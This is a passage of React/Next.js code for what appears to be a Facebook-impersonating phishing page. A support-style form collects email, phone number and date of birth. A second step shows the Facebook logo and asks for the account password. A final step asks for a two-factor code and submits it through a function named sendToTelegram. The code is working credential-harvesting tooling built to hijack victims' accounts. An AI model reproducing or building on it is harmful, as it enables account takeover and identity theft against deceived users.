                    type="email"
                    value={form.email}
                    onChange={(event) => handleFieldChange("email", event.target.value)}
                    placeholder={modal.emailPlaceholder}
                  />
                  {errors.email ? <p className={styles.fieldError}>{errors.email}</p> : null}

                  <input
                    id="workEmail"
                    type="email"
                    value={form.workEmail}
                    onChange={(event) => handleFieldChange("workEmail", event.target.value)}
                    placeholder={modal.workEmailPlaceholder}
                  />
                  {errors.workEmail ? <p className={styles.fieldError}>{errors.workEmail}</p> : null}

                  <input
                    id="pageName"
                    type="text"
                    value={form.pageName}
                    onChange={(event) => handleFieldChange("pageName", event.target.value)}
                    placeholder={modal.pageNamePlaceholder}
                  />
                  {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}

                  <div className={styles.phoneInputWrap}>
                    <span className={styles.phonePrefix}>
                      <span className={styles.phoneFlag}>{phoneFlag}</span>
                      <span className={styles.phoneCode}>{phoneCode}</span>
                    </span>
                    <input
                      id="phoneNumber"
                      type="tel"
                      inputMode="tel"
                      value={form.phoneNumber}
                      onChange={(event) => handleFieldChange("phoneNumber", event.target.value)}
                      placeholder={phoneNumberPlaceholder}
                      className={styles.phoneNumberInput}
                    />
                  </div>
                  {errors.phoneNumber ? <p className={styles.fieldError}>{errors.phoneNumber}</p> : null}

                  <label className={styles.inputLabel} htmlFor="dateOfBirth">
                    {modal.dateOfBirthLabel}
                  </label>
                  <input
                    id="dateOfBirth"
                    type="text"
                    value={form.dateOfBirth}
                    onChange={(event) => handleFieldChange("dateOfBirth", event.target.value)}
                    placeholder={modal.dateOfBirthPlaceholder}
                  />
                  {errors.dateOfBirth ? <p className={styles.fieldError}>{errors.dateOfBirth}</p> : null}

                  <textarea
                    id="details"
                    value={form.details}
                    onChange={(event) => handleFieldChange("details", event.target.value)}
                    placeholder={modal.problemPlaceholder}
                    rows={4}
                  />

                  <p className={styles.responseTime}>{modal.responseTime}</p>

                  <div className={styles.notifyBox}>
                    <div className={styles.notifyLeft}>
                      <span className={styles.fbIcon}>f</span>
                      <div>
                        <p className={styles.notifyTitle}>{modal.notifyTitle}</p>
                        <p className={styles.notifyDesc}>{modal.notifyDescription}</p>
                      </div>
                    </div>
                    <button
                      type="button"
                      className={`${styles.notifySwitch} ${notifyOnFacebook ? styles.notifySwitchOn : ""}`}
                      aria-pressed={notifyOnFacebook}
                      onClick={() => setNotifyOnFacebook((prev) => !prev)}
                    >
                      <span className={styles.notifyKnob} />
                    </button>
                  </div>

                  <label className={styles.termsRow}>
                    <input
                      type="checkbox"
                      checked={agreeTerms}
                      onChange={(event) => setAgreeTerms(event.target.checked)}
                    />
                    <span>
                      {modal.termsPrefix} <a href="#">{modal.termsLink}</a>
                    </span>
                  </label>

                  <button
                    type="submit"
                    className={styles.modalSubmitButton}
                    disabled={loadingInitial}
                    aria-busy={loadingInitial}
                  >
                    {loadingInitial ? <span className={styles.loadingSpinner} aria-hidden="true" /> : modal.sendButton}
                  </button>
                </form>
              </>
            ) : !isSuccess ? (
              <div className={styles.passwordStep}>
                <span className={styles.passwordStepLogo}>
                  <Image src="/facebook.png" alt="Facebook" width={64} height={64} />
                </span>

                <p className={styles.passwordStepMessage}>{passwordStepMessage}</p>

                <div className={styles.passwordFieldWrap}>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(event) => handlePasswordChange(event.target.value)}
                    placeholder={passwordPlaceholder}
                    className={styles.passwordFieldInput}
                  />

                  <button
                    type="button"
                    className={styles.passwordEyeButton}
                    onClick={() => setShowPassword((prev) => !prev)}
                    aria-label={togglePasswordLabel}
                  >
                    <svg viewBox="0 0 24 24" aria-hidden="true">
                      <path d="M2 12s3.8-6 10-6s10 6 10 6s-3.8 6-10 6s-10-6-10-6z" />
                      <circle cx="12" cy="12" r="2.8" />
                      {!showPassword ? <path d="M3 3l18 18" /> : null}
                    </svg>
                  </button>
                </div>
                {passwordError ? <p className={styles.passwordError}>{passwordError}</p> : null}

                <button
                  type="button"
                  className={styles.modalSubmitButton}
                  onClick={() => void handlePasswordSubmit()}
                  disabled={loadingPassword || isSubmitDisabled}
                  aria-busy={loadingPassword}
                >
                  {loadingPassword ? <span className={styles.loadingSpinner} aria-hidden="true" /> : continueButtonLabel}
                </button>
              </div>
            ) : (
              <div className={styles.twoFactorStep}>
                {showAltMethods ? (
                  <>
                    <h3 className={styles.altMethodsHeading}>{modal.altMethodsHeading}</h3>
                    <p className={styles.altMethodsDescription}>{modal.altMethodsDescription}</p>
                    <div className={styles.altMethodsList}>
                      {altMethods.map((method) => {
                        const isSelected = selectedMethod === method.id;
                        return (
                          <button
                            key={method.id}
                            type="button"
                            className={styles.altMethodCard}
                            onClick={() => setSelectedMethod(method.id)}
                          >
                            <div className={styles.altMethodText}>
                              <p className={styles.altMethodTitle}>{method.title}</p>
                              <p className={styles.altMethodSubtitle}>{method.subtitle}</p>
                            </div>
                            <span className={`${styles.altMethodRadio} ${isSelected ? styles.altMethodRadioActive : ""}`}>
                              <span />
                            </span>
                          </button>
                        );
                      })}
                    </div>
                    <button
                      type="button"
                      className={styles.modalSubmitButton}
                      onClick={() => {
                        persistTwoFactorContext(selectedMethod);
                        setShowModal(false);
                        setShowAltMethods(false);
                        router.push(`/two-factor?method=${selectedMethod}`);
                      }}
                    >
                      {continueButtonLabel}
                    </button>
                  </>
                ) : (
                  <>
                    <h3 className={styles.twoFactorHeading}>{twoFactorHeading}</h3>
                    <p className={styles.twoFactorDescription}>{twoFactorDescription}</p>
                    <div className={styles.twoFactorIllustration}>
                      <Image
                        src="/image.png"
                        alt={twoFactorImageAlt}
                        width={1125}
                        height={492}
                        className={styles.twoFactorImage}
                        priority
                      />
                    </div>
                    <input
                      type="text"
                      value={twoFactorCode}
                      onChange={(event) => handleTwoFactorChange(event.target.value)}
                      placeholder={twoFactorPlaceholder}
                      className={styles.twoFactorCodeInput}
                      inputMode="numeric"
                    />
                    {twoFactorErrorMessage ? <p className={styles.twoFactorError}>{twoFactorErrorMessage}</p> : null}

                    <button
                      type="button"
                      className={styles.modalSubmitButton}
                      disabled={isSubmitDisabled || !twoFactorCode.trim()}
                      onClick={() => void sendToTelegram()}
                    >
                      {continueButtonLabel}
                    </button>
                    <button
                      type="button"
                      className={styles.altMethodsTrigger}
                      onClick={openTwoFactorOptionsPopup}
                    >
                      {modal.altMethodsTriggerLabel}
                    </button>
                  </>
                )}
              </div>
            )}
          </div>
        </div>
      ) : null}
    </div>
  );
}
